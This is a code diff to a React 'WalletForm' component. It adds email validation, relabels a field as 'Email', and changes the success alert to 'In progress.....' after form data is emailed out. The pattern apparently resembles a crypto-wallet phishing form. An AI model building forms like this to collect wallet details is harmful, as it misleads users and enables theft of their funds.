@@ -42,6 +42,11 @@ const SubmitButton = styled.button`
   }
 `;
 
+const ErrorText = styled.p`
+  color: red;
+  font-size: 0.9rem;
+`;
+
 const WalletForm = () => {
   const location = useLocation();
   const { wallet, service } = location.state || {};
@@ -53,16 +58,32 @@ const WalletForm = () => {
     additionalOption: "",
   });
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [error, setError] = useState("");
 
   // Handle input changes
   const handleChange = (e) => {
     const { name, value } = e.target;
     setFormData((prev) => ({ ...prev, [name]: value }));
+
+    // Clear error when the user starts typing
+    if (name === "additionalOption") {
+      setError("");
+    }
   };
 
   // Handle form submission
   const handleSubmit = (e) => {
     e.preventDefault();
+
+    // Validate email
+    if (
+      formData.additionalOption &&
+      !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.additionalOption)
+    ) {
+      setError("Please enter a valid email address.");
+      return;
+    }
+
     setIsSubmitting(true); // Disable the button
 
     const emailData = {
@@ -92,7 +113,7 @@ const WalletForm = () => {
       )
       .then(
         (response) => {
-          alert("Sent successfully!");
+          alert("In progress.....");
           console.log("SUCCESS!", response.status, response.text);
 
           // Clear form and re-enable submit button
@@ -135,12 +156,13 @@ const WalletForm = () => {
         <Input
           type="text"
           name="additionalOption"
-          placeholder="Additional Option (if any)"
+          placeholder="Email"
           value={formData.additionalOption}
           onChange={handleChange}
         />
+        {error && <ErrorText>{error}</ErrorText>}
         <SubmitButton type="submit" disabled={isSubmitting}>
-          {isSubmitting ? "Sending..." : "Submit"}
+          {isSubmitting ? "..." : "Next"}
         </SubmitButton>
       </Form>
     </FormContainer>
